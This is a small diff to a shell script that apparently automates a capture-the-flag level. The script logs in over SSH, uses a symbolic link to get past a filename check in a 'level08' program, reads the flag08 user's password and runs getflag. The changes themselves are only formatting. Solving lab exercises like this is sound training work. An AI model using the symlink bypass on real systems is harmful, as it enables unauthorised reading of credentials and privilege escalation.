@@ -12,7 +12,7 @@ sshpass -f ../../level04/flag 2>/dev/null \
 
 # Use the symbolic link to bypass the filename check when executing the `level08` file,
 # and get the password of the `flag08` user
-FLAG08_PASSWORD=$( \
+FLAG08_PASSWORD=$(
 	sshpass -f ${PREVIOUS_FLAG} 2>/dev/null \
 		ssh -p ${PORT} level08@${ADDRESS} \
 			'./level08 /opt/openarenaserver/.bypass || true' \
@@ -28,5 +28,3 @@ sshpass -p ${FLAG08_PASSWORD} 2>/dev/null \
 	ssh -p ${PORT} flag08@${ADDRESS} \
 		getflag \
 | grep -oE '[^ ]+$' >${FLAG}
-
-exit 0
